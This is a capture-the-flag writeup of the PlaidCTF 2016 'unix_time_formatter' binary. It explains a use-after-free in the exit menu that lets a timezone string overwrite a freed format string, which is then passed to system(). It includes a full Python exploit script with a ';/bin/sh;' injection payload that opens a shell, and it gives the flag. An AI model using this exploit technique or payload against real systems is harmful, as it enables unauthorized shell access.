---
layout: post
title: pctf 2016 unix_time_formatter writeup
category: writeup
---

this is simple formatter of unix time, and there are vulnerability in exit function.
```C
signed __int64 menu_exit()
{
  signed __int64 result; // rax@1
  __int64 v1; // rcx@3
  char s; // [sp+8h] [bp-20h]@1
  __int64 v3; // [sp+18h] [bp-10h]@1

  v3 = *MK_FP(__FS__, 40LL);
  wrapper_free((void *)qword_602118);
  wrapper_free(value);
  __printf_chk(1LL, "Are you sure you want to exit (y/N)? ");
  fflush(stdout);
  fgets(&s, 16, stdin);
  result = 0LL;
  if ( (s & 0xDF) == 'Y' )
  {
    puts("OK, exiting.");
    result = 1LL;
  }
  v1 = *MK_FP(__FS__, 40LL) ^ v3;
  return result;
}
```
If I goto exit, and choose "N", then I can reuse free chunks.
so other thing is find values which is given by malloc.

there is a function which set time zone, and it uses strdup.
it uses malloc inside. [man strdup](http://linux.die.net/man/3/strdup)

and there are print_time function, it calls system with filtered argument "value".
but we can bypass with use-after-free at previous code.

so exploit step is :

 1. write any value to "qword_602118" (this is time format value)
 2. free at exit
 3. overwrite string at set_timezone
 4. call system at print_time


This is my exploit code.

```python
import pwnbox


# PCTF{use_after_free_isnt_so_bad}

local = False

if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q unix_time_formatter_9a0c42cadcb931cce0f9b7a1b4037c6b')
else:
    p = pwnbox.pipe.SocketPipe('unix.pwning.xxx',9999)

payload = '\';/bin/sh;\''

def lobby():
    p.read_until('5) Exit.\n')
    p.read_until('>')


def set_timeFormat(s):
    p.write('1\n')
    p.read_until('mat:')
    p.write(s+'\n')
    lobby()

def set_time(d):
    p.write('2\n')
    p.read_until('time: ')
    p.write('%d\n' % d)
    lobby()

def exit(s):
    p.write('5\n')
    p.read_until(')?')
    p.write(s+'\n')
    lobby()

def set_timeZone(s):
    p.write('3\n')
    p.read_until('zone:')
    p.write(s+'\n')
    lobby()

if local:
    p.read_until('(gdb)')
    p.write('r\n')


lobby()
set_timeFormat('a'*len(payload))
set_time(1)
exit('N')
set_timeZone(payload)
p.write('4\n')
p.interact()
```
 


